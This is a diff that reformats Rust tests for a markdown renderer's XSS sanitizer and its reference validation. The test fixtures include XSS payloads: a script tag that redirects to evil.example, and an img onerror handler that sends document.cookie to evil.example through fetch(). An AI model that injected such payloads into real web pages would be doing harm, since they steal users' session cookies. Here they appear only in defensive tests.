@@ -45,7 +45,8 @@ fn test_artifact_description_xss_escaped() {
 #[test]
 fn test_document_markdown_raw_html_stripped() {
     // Markdown <script> blocks must be escaped or removed from rendered HTML.
-    let input = "Normal text\n\n<script>document.location='http://evil.example'</script>\n\nMore text";
+    let input =
+        "Normal text\n\n<script>document.location='http://evil.example'</script>\n\nMore text";
     let html = render_markdown(input);
     assert!(
         !html.contains("<script>"),
@@ -77,7 +78,8 @@ fn test_document_image_url_javascript_blocked() {
 fn test_embed_card_xss_escaped() {
     // An {{artifact:ID}} embed with adversarial field values must render escaped.
     // We test this via the markdown sanitizer since embed cards are rendered through it.
-    let malicious_title = r#"<img src=x onerror="fetch('http://evil.example?c='+document.cookie)">"#;
+    let malicious_title =
+        r#"<img src=x onerror="fetch('http://evil.example?c='+document.cookie)">"#;
     let html = render_markdown(malicious_title);
     assert!(
         !html.contains("onerror"),
@@ -257,7 +259,10 @@ fn test_commit_coverage_validates_against_store() {
         "FAKE-999 is not in store, must not be in coverage"
     );
     assert!(
-        analysis.broken_refs.iter().any(|b| b.missing_id == "FAKE-999"),
+        analysis
+            .broken_refs
+            .iter()
+            .any(|b| b.missing_id == "FAKE-999"),
         "FAKE-999 must appear in broken refs"
     );
 }
@@ -451,9 +456,7 @@ fn test_validate_documents_checks_wiki_links() {
         "wiki-link to GHOST-001 must produce a diagnostic"
     );
     assert!(
-        diagnostics
-            .iter()
-            .any(|d| d.message.contains("GHOST-001")),
+        diagnostics.iter().any(|d| d.message.contains("GHOST-001")),
         "diagnostic must mention GHOST-001"
     );
 }
